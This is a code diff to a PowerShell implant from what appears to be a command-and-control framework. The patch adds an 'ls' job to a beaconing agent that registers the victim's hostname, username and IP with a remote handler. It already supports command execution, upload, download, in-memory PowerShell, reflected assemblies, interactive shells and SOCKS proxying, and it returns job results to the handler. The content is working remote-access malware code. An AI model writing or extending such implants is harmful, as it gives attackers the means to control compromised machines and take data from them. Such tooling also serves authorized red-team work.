@@ -492,7 +492,7 @@ function registerImplant {
     try{
         $ip = (Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address).IPAddressToString ;
     }catch{$ip = "127.0.0.1";}
-    $Body = "{`"implantType`":`"PowerShell`",`"localIp`":`""+$ip+"`",`"hostname`":`""+$env:COMPUTERNAME+"`",`"username`":`""+$env:UserName+"`",`"handler`":`"Multi`",`"connectionString`":`""+$config.handlers+"`",`"supportedPayloads`":[`"command`",`"exit`",`"upload`",`"download`",`"configure`",`"posh_in_mem`",`"reflected_assembly`",`"cd`",`"interactive`",`"socks`"],`"os`":`"windows`"}";
+    $Body = "{`"implantType`":`"PowerShell`",`"localIp`":`""+$ip+"`",`"hostname`":`""+$env:COMPUTERNAME+"`",`"username`":`""+$env:UserName+"`",`"handler`":`"Multi`",`"connectionString`":`""+$config.handlers+"`",`"supportedPayloads`":[`"command`",`"ls`",`"exit`",`"upload`",`"download`",`"configure`",`"posh_in_mem`",`"reflected_assembly`",`"cd`",`"interactive`",`"socks`"],`"os`":`"windows`"}";
     while($Result._id -eq $null){
         try{
             $Result = POSTREQ $targetUrl $Body;
@@ -553,6 +553,29 @@ function heartbeat {
                         Set-Location -Path $job.("payload").("options").dir -ErrorAction Stop;
                 }
                 sendJobResult $job._id (Get-Location).Path $false;
+        }
+        elseif($job.("payload").type -eq "ls"){
+            $targetPath = ".";
+            if($job.("payload").("options").path -ne $null -and $job.("payload").("options").path -ne ""){
+                $targetPath = $job.("payload").("options").path;
+            }
+
+            Set-Location -Path $targetPath -ErrorAction Stop;
+            $cwd = (Get-Location).Path;
+
+            $items = Get-ChildItem -LiteralPath "." -Force -ErrorAction Stop | ForEach-Object {
+                [PSCustomObject]@{
+                name = $_.Name;
+                size = $(if($_.PSIsContainer){ $null } else { [int64]$_.Length });
+                type = $(if($_.PSIsContainer){ "directory" } elseif($_ -is [System.IO.FileInfo]){ "file" } else { "other" });
+                }
+            };
+
+            $jsonResult = [PSCustomObject]@{
+                cwd = $cwd;
+                files = @($items);
+            } | ConvertTo-Json -Compress;
+            sendJobResult $job._id $jsonResult $false;
         }
         elseif($job.("payload").type -eq "upload"){
                 if($job.("payload").("options").path -ne $null){
